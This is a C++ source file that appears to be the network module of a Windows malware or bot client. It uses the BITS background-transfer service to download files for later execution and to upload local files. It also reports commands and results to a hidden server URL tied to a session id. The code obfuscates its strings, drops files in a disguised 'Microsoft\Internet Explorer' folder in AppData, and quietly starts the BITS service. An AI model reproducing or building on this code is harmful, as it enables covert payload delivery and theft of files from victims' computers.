#include "com_bits.h"
#include <WinSvc.h>

bool bits_com_service_setup() //bits_service
{
  //if(!IsUserAnAdmin()) return true; 
  // check if bits service is enabled
  wchar_t sMachine[MAX_COMPUTERNAME_LENGTH + 1];
  DWORD size = _countof(sMachine);
  GetComputerNameW(sMachine, &size);

  wchar_t sService[] = L"BITS";
  SC_HANDLE schManager = OpenSCManagerW(sMachine, NULL, SC_MANAGER_CONNECT);
  SC_HANDLE schService = OpenServiceW(schManager, sService, GENERIC_READ);
  SC_HANDLE MStart = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
  SC_HANDLE SStart = OpenServiceW(MStart, sService, SERVICE_ALL_ACCESS);	
  if (schManager == NULL) {
    return true; // no priv?
  }
  if (schService == NULL) {
    return true; // no priv?
  }

  // Query service status
  SERVICE_STATUS lpStatus;
  if (!QueryServiceStatus(schService, &lpStatus)) return true; // failed

  DWORD dwStatus = lpStatus.dwCurrentState;
  CloseServiceHandle(schService);
  CloseServiceHandle(schManager);

  switch (dwStatus) {
  case SERVICE_RUNNING:
    return true; // service is running
    break;

  case SERVICE_START_PENDING:
    Sleep(5000); // cool, waiting for it
    return true; // service is (hopefully) running
    break;

  case SERVICE_STOPPED:
  default:
    StartService(SStart,NULL,0);
    Sleep(5000); // cool, waiting for it
    return true; // I'm feeling lucky
    break;
  }

  return true; // untill we have something to fallback to?
}

bool bits_com_service_connect()
{
  g_pbcm = NULL;
  if (pNotifyInterface) pNotifyInterface->Release();
  pNotifyInterface = 0;
  //Specify the appropriate COM threading model for your application.
  hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
  if (!SUCCEEDED(hr)) return false;

  pNotifyInterface = new CNotifyInterface();

  hr = CoCreateInstance(__uuidof(BackgroundCopyManager3_0), NULL,
    CLSCTX_LOCAL_SERVER,
    __uuidof(IBackgroundCopyManager),
    (void**) &g_pbcm);
  bits_version = 30;
  if (SUCCEEDED(hr)) return true;
  hr = CoCreateInstance(__uuidof(BackgroundCopyManager2_5), NULL,
    CLSCTX_LOCAL_SERVER,
    __uuidof(IBackgroundCopyManager),
    (void**) &g_pbcm);
  bits_version = 25;
  if (SUCCEEDED(hr)) return true;
  hr = CoCreateInstance(__uuidof(BackgroundCopyManager2_0), NULL,
    CLSCTX_LOCAL_SERVER,
    __uuidof(IBackgroundCopyManager),
    (void**) &g_pbcm);
  bits_version = 20;
  if (SUCCEEDED(hr)) return true;
  hr = CoCreateInstance(__uuidof(BackgroundCopyManager1_5), NULL,
    CLSCTX_LOCAL_SERVER,
    __uuidof(IBackgroundCopyManager),
    (void**) &g_pbcm);
  bits_version = 15;
  if (SUCCEEDED(hr)) return true;
  hr = CoCreateInstance(__uuidof(BackgroundCopyManager), NULL,
    CLSCTX_LOCAL_SERVER,
    __uuidof(IBackgroundCopyManager),
    (void**) &g_pbcm);
  bits_version = 10;
  if (SUCCEEDED(hr)) return true;

  bits_version = 0;
  return false;
}

void bits_com_service_destroy()
{
  if (pNotifyInterface) {
    delete pNotifyInterface;
    pNotifyInterface = 0;
  }
  if (g_pbcm) {
    g_pbcm->Release();
    g_pbcm = NULL;
  }
  //CoUninitialize(); //Access Violation
}

void bits_com_clear_stale()
{
  IEnumBackgroundCopyJobs* pJobs = NULL;
  IBackgroundCopyJob* pJob = NULL;
  ULONG cJobCount = 0;
  ULONG idx = 0;  
  hr = g_pbcm->EnumJobs(0, &pJobs);
  if (SUCCEEDED(hr)) {
    pJobs->GetCount(&cJobCount);
    for (idx=0; idx<cJobCount; idx++) {
      if (S_OK == pJobs->Next(1, &pJob, NULL)) {
        WCHAR* pszJobName = NULL;
        if (pJob->GetDisplayName(&pszJobName) == S_OK) {
          if (wcslen(pszJobName) > 4) {
            pszJobName[4] = 0;
#ifndef _STRING_PROTECTION
            if (!wcscmp(pszJobName, S(L"bpcd"))) {
#else
            if (!wcscmp(pszJobName, S(L"\x56\x5f\x52\x5c\x01"))) {
#endif
              BG_JOB_STATE state;
              if (S_OK == pJob->GetState(&state)
                && state != BG_JOB_STATE_TRANSFERRING) {
                pJob->Cancel();
              }
            }
          }
        }
        CoTaskMemFree(pszJobName);
        pJob->Release();
        pJob = NULL;
      } else {
        break;
      }
    }
  }
  pJobs->Release();
  pJobs = NULL;
}

bool bits_com_file_download(std::wstring& url, std::wstring& path, enum kActions action)
{
  IBackgroundCopyJob* pJob = NULL;
  //To create an upload job, replace BG_JOB_TYPE_DOWNLOAD with 
  //BG_JOB_TYPE_UPLOAD or BG_JOB_TYPE_UPLOAD_REPLY.
  com_bits_job *job = new com_bits_job();
  if (!job) return false;
  wchar_t name[17];
  rand_wchar_t(name+4,12);
  name[1] = 'p';
  name[0] = 'b';
  name[3] = (IsUserAnAdmin() ? 'a' : 'd');
  name[2] = 'c';
  job->name = name;

  hr = g_pbcm->CreateJob(job->name.c_str(), BG_JOB_TYPE_DOWNLOAD, &job->id, &pJob);
  if (!SUCCEEDED(hr)) {
    delete job;
    return false;
  }
  //Save the JobId for later reference. 
  jobs.push_back(job);
  //Modify the job's property values.

  job->url = url;
  job->path = path;
  job->action = action;

  switch (action) {
    case kActionReport:
    case kActionSession:
    case kActionNoop:
      pJob->SetPriority(BG_JOB_PRIORITY_HIGH);
      break;
    case kActionDownload:
    case kActionRun:
      pJob->SetPriority(BG_JOB_PRIORITY_LOW);
      break;
  }
  
  //Add files to the job.
  pJob->AddFile(job->url.c_str(), job->path.c_str());

  hr = pJob->SetNotifyInterface(pNotifyInterface);

  if (SUCCEEDED(hr)) {
    hr = pJob->SetNotifyFlags(BG_NOTIFY_JOB_TRANSFERRED | 
      BG_NOTIFY_JOB_ERROR | BG_NOTIFY_JOB_MODIFICATION);
  } else {
    pNotifyInterface->Release();
    pNotifyInterface = new CNotifyInterface();
  }
  
  //Activate (resume) the job in the transfer queue.
  pJob->Resume();

  return true;
}

bool bits_com_file_upload(std::wstring& url, std::wstring& path)
{
  IBackgroundCopyJob* pJob = NULL;
  std::wstring::size_type pos;

  pos = path.find_last_of(L'\\', npos);
  if (pos == npos) return false; //invalid path
  pos++;
  url.append(urlencode(std::wstring(path.c_str()+pos)));

  //To create an upload job, replace BG_JOB_TYPE_DOWNLOAD with 
  //BG_JOB_TYPE_UPLOAD or BG_JOB_TYPE_UPLOAD_REPLY.
  com_bits_job *job = new com_bits_job();
  wchar_t name[17];
  rand_wchar_t(name+4,12);
  name[1] = 'p';
  name[0] = 'b';
  name[3] = (IsUserAnAdmin() ? 'a' : 'd');
  name[2] = 'u';
  job->name = name;

  hr = g_pbcm->CreateJob(job->name.c_str(), BG_JOB_TYPE_UPLOAD, &job->id, &pJob);
  assert(SUCCEEDED(hr));
  if (!SUCCEEDED(hr)) {
    delete job;
    return false;
  }
  //Save the JobId for later reference. 
  jobs.push_back(job);
  //Modify the job's property values.

  job->url = url;
  job->path = path;
  job->action = kActionUpload;

  pJob->SetPriority(BG_JOB_PRIORITY_LOW); //is this right?
  
  //Add files to the job.
  pJob->AddFile(job->url.c_str(), job->path.c_str());

  hr = pJob->SetNotifyInterface(pNotifyInterface);

  if (SUCCEEDED(hr)) {
    hr = pJob->SetNotifyFlags(BG_NOTIFY_JOB_TRANSFERRED | 
      BG_NOTIFY_JOB_ERROR | BG_NOTIFY_JOB_MODIFICATION);
  } else {
    pNotifyInterface->Release();
    pNotifyInterface = new CNotifyInterface();
    assert(SUCCEEDED(hr));
    if (!SUCCEEDED(hr)) {
      pJob->Cancel();
      pJob->Release();
      jobs.pop_back();
      delete job;
      return false;
    }
  }
  
  //Activate (resume) the job in the transfer queue.
  pJob->Resume();

  return true;
}

void send_report(std::wstring& cmd, std::wstring& entry)
{
  wchar_t rand[11];
  std::wstring url = S(REQUEST_REPORT);
  url.append(strSession);
#ifndef _STRING_PROTECTION
  url.append(S(L"&cmd="));
#else
  url.append(S(L"\x12\x4c\x5c\x5c\x3c\x56"));
#endif
  url.append(urlencode(cmd));
#ifndef _STRING_PROTECTION
  url.append(S(L"&entry="));
#else
  url.append(S(L"\x12\x4a\x5f\x4c\x73\x2f\x6c\x59"));
#endif
  url.append(urlencode(entry));
  rand_wchar_t(rand, 10);
  bits_com_file_download(url, generate_path(rand), kActionReport);
}

std::wstring generate_path(std::wstring name, int pref)
{
  std::wstring path;
  for (int i = pref; i < 6; i++) {
    wchar_t tmppath[MAX_PATH];
    FILE *stream;
    switch (i) {
      case 0:
      case 1:
        if (!SHGetSpecialFolderPathW(NULL, tmppath, CSIDL_LOCAL_APPDATA, true))
          continue; //method failed
        break;
      case 2:
      case 3:
        if (!SHGetSpecialFolderPathW(NULL, tmppath, CSIDL_APPDATA, true))
          continue; //method failed
        break;
      case 4:
        GetTempPathW((DWORD) _countof(tmppath), tmppath);
        break;
      case 5:
#ifndef _STRING_PROTECTION
        GetEnvironmentVariableW(S(L"TEMP"), tmppath, (DWORD) sizeof(tmppath)/sizeof(WCHAR));
#else
        GetEnvironmentVariableW(S(L"\x60\x6a\x7c\x68\x01"), tmppath, (DWORD) sizeof(tmppath)/sizeof(WCHAR));
#endif
        break;
    }
    if (!tmppath[0]) continue;
    path = tmppath;
    if (path.at(path.length()-1) != L'\\') {
      path.append(L"\\");
    }
    if (i == 0 || i == 2) {
#ifndef _STRING_PROTECTION
      path.append(S(L"Microsoft\\Internet Explorer\\"));
#else
      path.append(S(L"\x79\x46\x52\x4a\x6e\x25\x3e\x3f\x40\x73\x78\x56\x75\x33\x23\x37\x51\x5b\x11\x7d\x79\x26\x3d\x36\x46\x4a\x43\x64\x01"));
#endif
    }
    path.append(rand_wstring(7));
    if (!_wfopen_s(&stream, path.c_str(), L"a" )) {
      fclose(stream);
      DeleteFileW(path.c_str());
      path.resize(path.length() - 7);
      break;
    }
  }
  path.append(name);
  return path;
}

char rand_alnum()
{
  char c;
  c = (char) ((double)rand() / (RAND_MAX + 1) * 36);
  if (c < 26) c += 'a';
  else c += '0'-26;
  return c;
}

void rand_wchar_t (wchar_t *s, unsigned int sz)
{
  unsigned int i;
  for (i = 0; i < sz; i++)
  {
    s[i] = rand_alnum();
  }
  s[sz] = 0;
}

std::wstring rand_wstring (const int size) {
  std::wstring ret;
  int i;
  wchar_t c;
  
  for (i = 0; i < size; i++) {
    c = (wchar_t) ((double)rand() / (RAND_MAX + 1) * 36);
    if (c < 26) c += 'a';
    else c += '0'-26;
    ret.append(&c, 1);
  }
  return ret;
}

std::wstring urlencode(const std::wstring &c)
{
  std::wstring escaped;
  wchar_t buffer[8], buffer2;
  char chrBuffer[8];
	int i, j, max = c.length();

  for(i=0; i<max; i++)
  {
    switch (c[i]) {
      case '!':
      case '*':
      case '\'':
      case '(':
      case ')':
      case ';':
      case ':':
      case '@':
      case '$':
      case ',':
			//Unreserved:
      case '-':
			case '_':
			case '.':
			case '~':
			  escaped.append( &c[i], 1);
				break;
			default:
				if ((c[i] >= 'a' && c[i] <= 'z') || (c[i] >= 'A' && c[i] <= 'Z')
								|| (c[i] >= '0' && c[i] <= '9') ) {
					escaped.append( &c[i], 1);
				} else if (c[i] > 127) {
					j = WideCharToMultiByte(
						CP_UTF8,
						0,
						&c[i],
						1,
						chrBuffer,
						_countof(chrBuffer),
						NULL,
						NULL
					);
          chrBuffer[j] = 0;

          for (j = 0; chrBuffer[j]; j++) {
            mbtowc(&buffer2, &chrBuffer[j], 1);
#ifndef _STRING_PROTECTION
            swprintf_s(buffer, 8, S(L"%%%02x"), buffer2);
#else
            swprintf_s(buffer, 8, S(L"\x11\x0a\x14\x08\x33\x2e\x51"), buffer2);
#endif
            escaped.append(buffer);
          }

				} else {
#ifndef _STRING_PROTECTION
					swprintf_s(buffer, 8, S(L"%%%02x"), c[i]);
#else
					swprintf_s(buffer, 8, S(L"\x11\x0a\x14\x08\x33\x2e\x51"), c[i]);
#endif
					escaped.append(buffer);
				}
    }
  }
  return escaped;
}
